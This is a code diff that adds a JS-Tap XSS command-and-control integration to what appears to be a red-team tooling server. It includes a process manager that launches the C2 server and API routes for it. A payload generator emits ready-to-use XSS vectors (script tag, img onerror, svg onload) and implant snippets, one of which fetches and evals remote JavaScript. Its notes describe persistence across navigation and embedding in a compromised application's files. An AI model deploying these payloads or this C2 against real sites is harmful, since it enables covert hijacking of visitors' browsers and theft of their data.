@@ -17250,6 +17250,355 @@ def get_alternative_tools():
         logger.error(f"Error getting alternative tools: {str(e)}")
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
+# ============================================================================
+# JS-TAP XSS C2 INTEGRATION
+# ============================================================================
+
+class JSTapManager:
+    """Manages the JS-Tap XSS C2 server lifecycle for red team operations.
+
+    JS-Tap delivers a JavaScript implant (telemlib.js) via XSS or direct
+    injection. This manager handles process start/stop/status and generates
+    ready-to-use payload snippets for trap and implant deployment modes.
+    """
+
+    def __init__(self):
+        self._process = None
+        self._port = 8444
+        self._host = "0.0.0.0"
+        self._jstap_dir = None
+        self._start_time = None
+
+    def _find_jstap_dir(self, custom_path: str = None) -> Optional[str]:
+        """Locate JS-Tap installation directory."""
+        if custom_path and os.path.isdir(custom_path):
+            if os.path.isfile(os.path.join(custom_path, "jsTapServer.py")):
+                return custom_path
+
+        base_dir = os.path.dirname(os.path.abspath(__file__))
+        candidates = [
+            os.path.join(base_dir, "tools", "jstap"),
+            os.path.join(base_dir, "jstap"),
+            os.path.expanduser("~/tools/JS-Tap"),
+            "/opt/JS-Tap",
+        ]
+        for path in candidates:
+            if os.path.isfile(os.path.join(path, "jsTapServer.py")):
+                return path
+        return None
+
+    def _ensure_certs(self, jstap_dir: str) -> bool:
+        """Generate a self-signed cert/key pair in jstap_dir if missing."""
+        cert = os.path.join(jstap_dir, "cert.pem")
+        key = os.path.join(jstap_dir, "key.pem")
+        if os.path.isfile(cert) and os.path.isfile(key):
+            return True
+        logger.info("🔐 Generating self-signed SSL certificates for JS-Tap...")
+        try:
+            cmd = (
+                f'openssl req -x509 -newkey rsa:4096 -keyout "{key}" -out "{cert}" '
+                f"-days 365 -nodes -subj /CN=jstap-c2"
+            )
+            result = subprocess.run(
+                cmd, shell=True, capture_output=True, text=True, cwd=jstap_dir
+            )
+            if result.returncode != 0:
+                logger.error(f"openssl stderr: {result.stderr.strip()}")
+            return result.returncode == 0
+        except Exception as e:
+            logger.error(f"Cert generation exception: {e}")
+            return False
+
+    def start(
+        self,
+        jstap_dir: str = None,
+        port: int = 8444,
+        host: str = "0.0.0.0",
+        use_gunicorn: bool = True,
+    ) -> Dict[str, Any]:
+        """Start the JS-Tap C2 server as a background subprocess."""
+        if self._process and self._process.poll() is None:
+            return {
+                "success": False,
+                "error": "JS-Tap is already running",
+                "pid": self._process.pid,
+                "port": self._port,
+                "portal": f"https://{self._host}:{self._port}",
+            }
+
+        found_dir = self._find_jstap_dir(jstap_dir)
+        if not found_dir:
+            return {
+                "success": False,
+                "error": (
+                    "JS-Tap directory not found. "
+                    "Clone to tools/jstap/ or provide jstap_dir path."
+                ),
+            }
+
+        self._jstap_dir = found_dir
+        self._port = port
+        self._host = host
+
+        if not self._ensure_certs(found_dir):
+            return {
+                "success": False,
+                "error": "SSL cert generation failed. Ensure openssl is installed.",
+            }
+
+        gunicorn_available = shutil.which("gunicorn") is not None
+        use_ssl = use_gunicorn and gunicorn_available
+
+        if use_ssl:
+            cmd = [
+                "gunicorn",
+                "jsTapServer:app",
+                "--workers", "2",
+                "--worker-class", "gthread",
+                "--threads", "4",
+                "--bind", f"{host}:{port}",
+                "--certfile", "cert.pem",
+                "--keyfile", "key.pem",
+                "--log-level", "info",
+            ]
+            logger.info(f"🚀 Starting JS-Tap via Gunicorn (HTTPS) on {host}:{port}")
+        else:
+            # Fallback: run the server script directly (HTTP, dev-only)
+            cmd = [sys.executable, "jsTapServer.py"]
+            logger.info(f"🚀 Starting JS-Tap via Python (HTTP fallback) on {host}:{port}")
+
+        try:
+            log_path = os.path.join(found_dir, "jstap_server.log")
+            log_file = open(log_path, "w")
+            self._process = subprocess.Popen(
+                cmd,
+                cwd=found_dir,
+                stdout=log_file,
+                stderr=log_file,
+                stdin=subprocess.DEVNULL,
+            )
+            self._start_time = datetime.now()
+
+            # Brief pause to catch immediate startup failures
+            time.sleep(2)
+            if self._process.poll() is not None:
+                return {
+                    "success": False,
+                    "error": f"JS-Tap exited immediately. Check {log_path}",
+                }
+
+            proto = "https" if use_ssl else "http"
+            return {
+                "success": True,
+                "pid": self._process.pid,
+                "port": port,
+                "host": host,
+                "portal": f"{proto}://{host}:{port}",
+                "jstap_dir": found_dir,
+                "log": log_path,
+                "started_at": self._start_time.isoformat(),
+                "mode": "gunicorn+ssl" if use_ssl else "python-fallback",
+            }
+        except Exception as e:
+            return {"success": False, "error": f"Failed to launch JS-Tap: {e}"}
+
+    def stop(self) -> Dict[str, Any]:
+        """Terminate the running JS-Tap C2 process."""
+        if not self._process:
+            return {"success": False, "error": "JS-Tap is not running"}
+        if self._process.poll() is not None:
+            self._process = None
+            return {"success": True, "message": "JS-Tap was already stopped"}
+        pid = self._process.pid
+        try:
+            self._process.terminate()
+            try:
+                self._process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self._process.kill()
+            self._process = None
+            self._start_time = None
+            logger.info(f"🛑 JS-Tap (PID {pid}) stopped")
+            return {"success": True, "message": f"JS-Tap stopped (PID {pid})"}
+        except Exception as e:
+            return {"success": False, "error": f"Error stopping JS-Tap: {e}"}
+
+    def status(self) -> Dict[str, Any]:
+        """Return current JS-Tap process status."""
+        if not self._process:
+            return {"running": False, "pid": None, "port": None, "uptime": None}
+        alive = self._process.poll() is None
+        uptime = None
+        if alive and self._start_time:
+            uptime = str(datetime.now() - self._start_time).split(".")[0]
+        return {
+            "running": alive,
+            "pid": self._process.pid if alive else None,
+            "port": self._port if alive else None,
+            "host": self._host if alive else None,
+            "jstap_dir": self._jstap_dir,
+            "uptime": uptime,
+            "portal": f"https://{self._host}:{self._port}" if alive else None,
+        }
+
+    def generate_payload(
+        self,
+        server_url: str,
+        mode: str = "trap",
+        custom_js: str = "",
+    ) -> Dict[str, Any]:
+        """Build ready-to-use JS-Tap XSS payload snippets.
+
+        Args:
+            server_url: Base URL of the running JS-Tap server.
+            mode: 'trap' (XSS delivery + iframe persistence) or
+                  'implant' (embed in existing app JS).
+            custom_js: Optional extra JavaScript appended after the implant.
+
+        Returns:
+            Dict with payload variants and usage notes.
+        """
+        if not server_url.startswith(("http://", "https://")):
+            server_url = f"https://{server_url}"
+        server_url = server_url.rstrip("/")
+        telemlib_url = f"{server_url}/telemlib.js"
+
+        if mode not in ("trap", "implant"):
+            return {
+                "success": False,
+                "error": f"Unknown mode '{mode}'. Use 'trap' or 'implant'.",
+            }
+
+        payloads = {}
+
+        if mode == "trap":
+            payloads["script_tag"] = (
+                f'<script src="{telemlib_url}"></script>'
+            )
+            payloads["img_onerror"] = (
+                f"<img src=x onerror=\"var s=document.createElement('script');"
+                f"s.src='{telemlib_url}';document.head.appendChild(s)\">"
+            )
+            payloads["svg_onload"] = (
+                f"<svg onload=\"var s=document.createElement('script');"
+                f"s.src='{telemlib_url}';document.head.appendChild(s)\">"
+            )
+        else:  # implant
+            payloads["dynamic_import"] = f"import('{telemlib_url}');"
+            payloads["iife"] = (
+                f"(function(){{var s=document.createElement('script');"
+                f"s.src='{telemlib_url}';document.head.appendChild(s);}})();"
+            )
+            payloads["fetch_exec"] = (
+                f"fetch('{telemlib_url}').then(r=>r.text()).then(c=>eval(c));"
+            )
+
+        if custom_js:
+            payloads["combined"] = (
+                f'<script src="{telemlib_url}"></script>'
+                f"<script>{custom_js}</script>"
+            )
+
+        return {
+            "success": True,
+            "server_url": server_url,
+            "telemlib_url": telemlib_url,
+            "mode": mode,
+            "payloads": payloads,
+            "notes": {
+                "trap": (
+                    "Inject via XSS. Uses iframe persistence to survive "
+                    "user navigation and tab close."
+                ),
+                "implant": (
+                    "Embed directly in the target app's JS files. "
+                    "Executes on every page load after server compromise."
+                ),
+                "portal": f"Operator dashboard: {server_url} (login required)",
+            },
+        }
+
+
+# Global JS-Tap manager instance (one per HexStrike server process)
+jstap_manager = JSTapManager()
+
+
+@app.route("/api/tools/jstap/start", methods=["POST"])
+def jstap_start():
+    """Start the JS-Tap XSS C2 server."""
+    try:
+        params = request.json or {}
+        jstap_dir = params.get("jstap_dir", None)
+        port = int(params.get("port", 8444))
+        host = params.get("host", "0.0.0.0")
+        use_gunicorn = params.get("use_gunicorn", True)
+
+        logger.info(f"🎣 Starting JS-Tap C2 on {host}:{port}")
+        result = jstap_manager.start(
+            jstap_dir=jstap_dir, port=port, host=host, use_gunicorn=use_gunicorn
+        )
+        if result.get("success"):
+            logger.info(
+                f"✅ JS-Tap started: PID {result.get('pid')} | {result.get('portal')}"
+            )
+        else:
+            logger.error(f"❌ JS-Tap start failed: {result.get('error')}")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 jstap/start error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+@app.route("/api/tools/jstap/stop", methods=["POST"])
+def jstap_stop():
+    """Stop the running JS-Tap C2 server."""
+    try:
+        logger.info("🛑 Stopping JS-Tap C2 server")
+        result = jstap_manager.stop()
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 jstap/stop error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+@app.route("/api/tools/jstap/status", methods=["GET"])
+def jstap_status_route():
+    """Return JS-Tap server running status."""
+    try:
+        return jsonify(jstap_manager.status())
+    except Exception as e:
+        logger.error(f"💥 jstap/status error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+@app.route("/api/tools/jstap/payload", methods=["POST"])
+def jstap_payload():
+    """Generate JS-Tap XSS payload snippets for a given server URL."""
+    try:
+        params = request.json or {}
+        server_url = params.get("server_url", "")
+        mode = params.get("mode", "trap")
+        custom_js = params.get("custom_js", "")
+
+        if not server_url:
+            status = jstap_manager.status()
+            if status.get("running"):
+                server_url = status["portal"]
+            else:
+                return jsonify({
+                    "error": "server_url is required (or start JS-Tap first)"
+                }), 400
+
+        logger.info(f"🎯 Generating JS-Tap '{mode}' payload for {server_url}")
+        result = jstap_manager.generate_payload(
+            server_url=server_url, mode=mode, custom_js=custom_js
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 jstap/payload error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
